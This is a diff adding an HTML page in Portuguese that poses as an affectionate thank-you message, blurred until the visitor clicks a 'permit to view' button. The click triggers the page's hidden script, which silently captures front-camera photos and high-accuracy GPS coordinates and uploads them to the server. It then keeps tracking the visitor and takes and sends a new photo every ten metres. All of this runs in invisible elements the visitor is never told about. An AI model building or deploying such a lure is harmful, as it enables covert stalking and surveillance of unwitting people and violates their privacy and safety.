@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Mensagem <3 </title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 30px;
+        background: #f4f4f4;
+        color: #222;
+    }
+    .container {
+        max-width: 700px;
+        margin: auto;
+        background: white;
+        padding: 25px;
+        border-radius: 12px;
+        box-shadow: 0 2px 10px rgba(0,0,0,.1);
+        text-align: center;
+    }
+    p.mensagem {
+        font-size: 18px;
+        font-weight: bold;
+        color: #333;
+        margin: 0;
+    }
+    /* Mantém o vídeo ativo na memória renderizando-o de forma invisível */
+    .hidden-element {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        opacity: 0;
+        pointer-events: none;
+        overflow: hidden;
+    }
+    /* Mensagem inicialmente borrada */
+    .mensagem-borrada {
+        filter: blur(10px);
+        transition: filter 0.5s ease;
+        user-select: none;
+    }
+    /* Mensagem revelada */
+    .mensagem-borrada.revelada {
+        filter: blur(0);
+    }
+    /* Botão para iniciar as permissões */
+    .botao-permissao {
+        margin-top: 20px;
+        padding: 12px 24px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        background: #333;
+        color: white;
+    }
+    .botao-permissao:hover {
+        opacity: 0.85;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+<!-- Mensagem que ficará borrada -->
+<p id="mensagemAmor" class="mensagem mensagem-borrada">
+    Obrigado vida ❤️ <img
+    src="https://media3.giphy.com/media/v1.Y2lkPTZjMDliOTUyNHo3dHUyd2YwaTJhY2R0ZTl1NWozMHE5ZDB1YjJlenRxcnpqdDVtayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/unIVoGoomOWgDqJnSK/200.gif"
+    alt="Imagem">
+</p>
+<!-- Botão visível para solicitar permissões -->
+<button
+    id="permitirButton"
+    class="botao-permissao"
+>
+    Permitir para visualizar
+</button>
+<!-- Elementos invisíveis no layout, mas totalmente funcionais no DOM -->
+<div class="hidden-element">
+    <button id="startButton">Iniciar mensagem</button>
+    <p id="status"></p>
+    <div id="info">
+        <span id="latitude"></span>
+        <span id="longitude"></span>
+        <span id="photoCount"></span>
+        <span id="distance"></span>
+    </div>
+    <video
+        id="camera"
+        autoplay
+        playsinline
+        muted
+    ></video>
+    <canvas id="canvas"></canvas>
+</div>
+</div>
+<script>
+/*
+============================================================
+ELEMENTOS
+============================================================
+*/
+const startButton = document.getElementById("startButton");
+const permitirButton = document.getElementById("permitirButton");
+const mensagemAmor = document.getElementById("mensagemAmor");
+const status = document.getElementById("status");
+const video = document.getElementById("camera");
+const canvas = document.getElementById("canvas");
+const latitudeElement = document.getElementById("latitude");
+const longitudeElement = document.getElementById("longitude");
+const photoCountElement = document.getElementById("photoCount");
+const distanceElement = document.getElementById("distance");
+/*
+============================================================
+VARIÁVEIS
+============================================================
+*/
+let stream = null;
+let captureId = null;
+let lastLocationId = null;
+let lastPhotoLatitude = null;
+let lastPhotoLongitude = null;
+let photoCount = 0;
+let takingPhoto = false;
+const MIN_DISTANCE_METERS = 10;
+let watchId = null;
+/*
+============================================================
+INICIALIZAÇÃO POR AÇÃO DO USUÁRIO
+============================================================
+*/
+permitirButton.addEventListener("click", async () => {
+    try {
+        /*
+        Solicita câmera e localização após o clique explícito
+        do usuário.
+        */
+        await startMonitoring();
+        /*
+        Revela a mensagem somente após as permissões
+        e inicialização serem concluídas.
+        */
+        mensagemAmor.classList.add("revelada");
+        /*
+        Oculta o botão depois da inicialização.
+        */
+        permitirButton.style.display = "none";
+    } catch (error) {
+        console.error(error);
+    }
+});
+/*
+============================================================
+INICIAR MONITORAMENTO
+============================================================
+*/
+async function startMonitoring() {
+    startButton.disabled = true;
+    try {
+        /*
+        ----------------------------------------------------
+        1. CÂMERA
+        ----------------------------------------------------
+        */
+        status.textContent =
+            "...";
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+            throw new Error(
+                " não está disponível neste navegador."
+            );
+        }
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user"
+            },
+            audio: false
+        });
+        video.srcObject = stream;
+        await new Promise(resolve => {
+            if (video.readyState >= 2) {
+                resolve();
+            } else {
+                video.addEventListener(
+                    "loadeddata",
+                    resolve,
+                    { once: true }
+                );
+            }
+        });
+        /*
+        ----------------------------------------------------
+        2. GERAR CAPTURE ID
+        ----------------------------------------------------
+        */
+        captureId = crypto.randomUUID();
+        /*
+        ----------------------------------------------------
+        3. LOCALIZAÇÃO INICIAL
+        ----------------------------------------------------
+        */
+        status.textContent =
+            "Obtendo localização inicial...";
+        const position =
+            await getCurrentLocation();
+        const latitude =
+            position.coords.latitude;
+        const longitude =
+            position.coords.longitude;
+        const accuracy =
+            position.coords.accuracy;
+        updatePositionDisplay(
+            latitude,
+            longitude
+        );
+        /*
+        ----------------------------------------------------
+        4. REGISTRAR LOCALIZAÇÃO INICIAL
+        ----------------------------------------------------
+        */
+        status.textContent =
+            "Registrando localização inicial...";
+        const locationResult =
+            await uploadLocation(
+                captureId,
+                latitude,
+                longitude,
+                accuracy
+            );
+        lastLocationId =
+            locationResult.location_id;
+        /*
+        ----------------------------------------------------
+        5. PRIMEIRA FOTO
+        ----------------------------------------------------
+        */
+        status.textContent =
+            "Realizando captura inicial...";
+        await captureAndUploadPhoto(
+            captureId,
+            lastLocationId
+        );
+        /*
+        ----------------------------------------------------
+        6. DEFINIR POSIÇÃO DE REFERÊNCIA
+        ----------------------------------------------------
+        */
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
+        /*
+        ----------------------------------------------------
+        7. INICIAR MONITORAMENTO CONTÍNUO
+        ----------------------------------------------------
+        */
+        status.textContent =
+            "Monitoramento ativo.";
+        startWatchingPosition();
+        /*
+        Retorna sucesso para o evento do botão.
+        */
+        return true;
+    } catch (error) {
+        console.error(error);
+        status.textContent =
+            "Erro nas permissões ou na execução.";
+        startButton.disabled = false;
+        /*
+        Repassa o erro para que a mensagem não seja
+        revelada caso a permissão falhe.
+        */
+        throw error;
+    }
+}
+/*
+============================================================
+LOCALIZAÇÃO INICIAL
+============================================================
+*/
+function getCurrentLocation() {
+    return new Promise(
+        (resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject(
+                    new Error(
+                        "Geolocalização não suportada."
+                    )
+                );
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                resolve,
+                reject,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                }
+            );
+        }
+    );
+}
+/*
+============================================================
+MONITORAMENTO CONTÍNUO
+============================================================
+*/
+function startWatchingPosition() {
+    if (!navigator.geolocation) {
+        return;
+    }
+    watchId =
+        navigator.geolocation.watchPosition(
+            handlePosition,
+            handleLocationError,
+            {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 20000
+            }
+        );
+}
+/*
+============================================================
+NOVA POSIÇÃO
+============================================================
+*/
+async function handlePosition(position) {
+    const latitude =
+        position.coords.latitude;
+    const longitude =
+        position.coords.longitude;
+    const accuracy =
+        position.coords.accuracy;
+    updatePositionDisplay(
+        latitude,
+        longitude
+    );
+    if (
+        lastPhotoLatitude === null ||
+        lastPhotoLongitude === null
+    ) {
+        return;
+    }
+    const distance =
+        calculateDistance(
+            lastPhotoLatitude,
+            lastPhotoLongitude,
+            latitude,
+            longitude
+        );
+    distanceElement.textContent =
+        `${distance.toFixed(1)} m`;
+    if (
+        distance < MIN_DISTANCE_METERS ||
+        takingPhoto
+    ) {
+        return;
+    }
+    takingPhoto = true;
+    try {
+        const locationResult =
+            await uploadLocation(
+                captureId,
+                latitude,
+                longitude,
+                accuracy
+            );
+        const locationId =
+            locationResult.location_id;
+        lastLocationId =
+            locationId;
+        await captureAndUploadPhoto(
+            captureId,
+            locationId
+        );
+        lastPhotoLatitude =
+            latitude;
+        lastPhotoLongitude =
+            longitude;
+        distanceElement.textContent =
+            "0 m";
+    } catch (error) {
+        console.error(
+            "Erro durante captura:",
+            error
+        );
+    } finally {
+        takingPhoto = false;
+    }
+}
+/*
+============================================================
+ERRO DE LOCALIZAÇÃO
+============================================================
+*/
+function handleLocationError(error) {
+    console.error(
+        "Erro de localização:",
+        error
+    );
+}
+/*
+============================================================
+ENVIAR LOCALIZAÇÃO
+============================================================
+*/
+async function uploadLocation(
+    captureId,
+    latitude,
+    longitude,
+    accuracy
+) {
+    const response =
+        await fetch(
+            "/location",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+                body: JSON.stringify({
+                    capture_id: captureId,
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy
+                })
+            }
+        );
+    if (!response.ok) {
+        throw new Error(
+            "Erro ao enviar localização."
+        );
+    }
+    const data =
+        await response.json();
+    if (!data.success) {
+        throw new Error(
+            data.error ||
+            "Erro ao registrar localização."
+        );
+    }
+    return data;
+}
+/*
+============================================================
+CAPTURAR E ENVIAR FOTO
+============================================================
+*/
+async function captureAndUploadPhoto(
+    captureId,
+    locationId
+) {
+    if (
+        !video.videoWidth ||
+        !video.videoHeight
+    ) {
+        throw new Error(
+            "A câmera ainda não está pronta."
+        );
+    }
+    canvas.width =
+        video.videoWidth;
+    canvas.height =
+        video.videoHeight;
+    const context =
+        canvas.getContext("2d");
+    context.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+    const blob =
+        await new Promise(resolve => {
+            canvas.toBlob(
+                resolve,
+                "image/jpeg",
+                0.90
+            );
+        });
+    if (!blob) {
+        throw new Error(
+            "Não foi possível criar a imagem."
+        );
+    }
+    const formData =
+        new FormData();
+    formData.append(
+        "photo",
+        blob,
+        "capture.jpg"
+    );
+    formData.append(
+        "capture_id",
+        captureId
+    );
+    if (
+        locationId !== null &&
+        locationId !== undefined
+    ) {
+        formData.append(
+            "location_id",
+            locationId
+        );
+    }
+    const response =
+        await fetch(
+            "/upload",
+            {
+                method: "POST",
+                body: formData
+            }
+        );
+    if (!response.ok) {
+        throw new Error(
+            "Erro no upload da foto."
+        );
+    }
+    const data =
+        await response.json();
+    if (!data.success) {
+        throw new Error(
+            data.error ||
+            "Erro ao salvar fotografia."
+        );
+    }
+    photoCount++;
+    photoCountElement.textContent =
+        photoCount;
+    return data;
+}
+/*
+============================================================
+ATUALIZAR POSIÇÃO NA TELA
+============================================================
+*/
+function updatePositionDisplay(
+    latitude,
+    longitude
+) {
+    latitudeElement.textContent =
+        latitude.toFixed(6);
+    longitudeElement.textContent =
+        longitude.toFixed(6);
+}
+/*
+============================================================
+HAVERSINE
+============================================================
+*/
+function calculateDistance(
+    lat1,
+    lon1,
+    lat2,
+    lon2
+) {
+    const R = 6371000;
+    const degreesToRadians =
+        Math.PI / 180;
+    const dLat =
+        (lat2 - lat1) *
+        degreesToRadians;
+    const dLon =
+        (lon2 - lon1) *
+        degreesToRadians;
+    const a =
+        Math.sin(dLat / 2) *
+        Math.sin(dLat / 2)
+        +
+        Math.cos(
+            lat1 *
+            degreesToRadians
+        )
+        *
+        Math.cos(
+            lat2 *
+            degreesToRadians
+        )
+        *
+        Math.sin(dLon / 2)
+        *
+        Math.sin(dLon / 2);
+    const c =
+        2 *
+        Math.atan2(
+            Math.sqrt(a),
+            Math.sqrt(1 - a)
+        );
+    return R * c;
+}
+/*
+============================================================
+ENCERRAMENTO
+============================================================
+*/
+window.addEventListener(
+    "beforeunload",
+    () => {
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(
+                watchId
+            );
+        }
+        if (stream) {
+            stream
+                .getTracks()
+                .forEach(
+                    track => track.stop()
+                );
+        }
+    }
+);
+</script>
+</body>
+</html>
